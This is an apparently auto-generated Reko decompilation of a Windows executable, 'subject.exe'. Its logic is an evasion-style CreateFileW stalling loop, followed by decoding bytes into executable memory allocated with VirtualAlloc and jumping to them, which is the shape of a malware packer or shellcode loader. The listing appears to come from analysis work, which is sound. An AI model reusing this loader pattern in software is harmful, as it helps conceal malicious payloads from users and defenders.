// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 0040AE59: Register Eq_2 Win32CrtStartup()
DWORD Win32CrtStartup()
{
	return fn0040AE67();
}

// 0040AE67: Register word32 fn0040AE67()
word32 fn0040AE67()
{
	ptr32 esp_1 = fp;
	int32 esi_2 = 0x00;
	do
	{
		HANDLE * esp_7 = esp_1 - 0x04;
		*esp_7 = (HANDLE *) null;
		*(esp_7 - 0x04) = 0x0050D0EE;
		*(esp_7 - 0x08) = 0x14;
		*(esp_7 - 0x0C) = 0x00;
		*(esp_7 - 0x10) = 1715048;
		*(esp_7 - 0x14) = 0x1C;
		*(esp_7 - 0x18) = 0x00;
		byte al_23 = (byte) (CreateFileW(*(esp_7 - 0x18), *(esp_7 - 0x14), *(esp_7 - 0x10), *(esp_7 - 0x0C), *(esp_7 - 0x08), *(esp_7 - 0x04), *esp_7) & 0x9F);
		word32 edx_26 = (word32) al_23;
		esp_1 = esp_7 - 0x18;
		esi_2 = esi_2 + edx_26;
	} while (esi_2 < 0x40394B31);
	*(esp_7 - 0x1C) = edx_26;
	*(esp_7 - 0x20) = 0x40;
	*(esp_7 - 0x24) = 0x3000;
	*(esp_7 - 0x28) = 0x0001368F;
	*(esp_7 - 44) = 0x00;
	Eq_42 eax_45 = VirtualAlloc(*(esp_7 - 44), *(esp_7 - 0x28), *(esp_7 - 0x24), *(esp_7 - 0x20));
	byte * esi_50 = *(esp_7 - 0x28) + 0xF3;
	*(esp_7 - 44) = (union Eq_42 *) eax_45;
	Eq_42 edi_49 = eax_45;
	ptr32 esp_52 = esp_7 - 44;
	word32 ecx_109 = 0x01DB;
	uint32 edx_105 = 3739363512;
	byte dl_104 = 0xB8;
	Eq_93 ebp_100 = null;
	do
	{
		byte bh_71 = *esi_50 + dl_104 + al_23;
		*edi_49 = bh_71;
		uint32 * esp_74 = esp_52 - 0x04;
		*esp_74 = edx_105;
		*(esp_74 - 0x04) = ecx_109;
		*(esp_74 - 0x08) = 0x00;
		*(esp_74 - 0x0C) = 0x0F;
		*(esp_74 - 0x10) = 0x11;
		*(esp_74 - 0x14) = 0x00;
		*(esp_74 - 0x18) = 0x17;
		*(esp_74 - 0x1C) = 0x00C33670;
		*(esp_74 - 0x20) = 0x00;
		Eq_97 eax_92 = CreateFileW(*(esp_74 - 0x20), *(esp_74 - 0x1C), *(esp_74 - 0x18), *(esp_74 - 0x14), *(esp_74 - 0x10), *(esp_74 - 0x0C), *(esp_74 - 0x08));
		uint32 edx_95 = *(esp_74 - 0x1C);
		esi_50 = esi_50 + 0x01;
		edi_49 = edi_49 + 0x01;
		word32 ecx_93 = *(esp_74 - 0x20);
		esp_52 = esp_74 - 0x18;
		edx_105 = edx_95 >> 0x08;
		dl_104 = (byte) (edx_95 >> 0x08);
		ebp_100 = (Eq_93) ((char *) ebp_100 + 0x01);
		if (ebp_100 == eax_92 + 0x05)
		{
			edx_105 = 3739363512;
			dl_104 = 0xB8;
			ebp_100 = null;
		}
		ecx_109 = ecx_93 - 0x01;
	} while (ecx_93 != 0x01);
	<anonymous> * eax_112 = *(esp_74 - 0x18);
	word32 esp_116;
	word32 esi_117;
	byte SZO_118;
	byte C_119;
	word32 eax_120;
	word32 edx_121;
	byte dl_122;
	byte al_123;
	byte SCZO_124;
	byte SO_125;
	byte bl_126;
	word32 ecx_127;
	word32 edi_128;
	word32 ebp_129;
	byte bh_130;
	byte Z_131;
	eax_112();
	return eax_120;
}

